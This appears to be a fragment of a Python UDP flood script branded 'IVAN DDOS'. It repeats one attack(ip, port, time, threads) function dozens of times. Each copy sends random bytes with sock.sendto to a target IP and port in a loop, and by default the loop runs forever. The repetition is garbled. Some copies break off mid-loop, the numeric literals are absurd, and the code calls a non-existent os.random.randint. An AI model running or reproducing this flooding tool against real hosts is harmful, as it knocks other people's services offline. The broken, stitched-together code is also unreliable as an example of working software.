    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

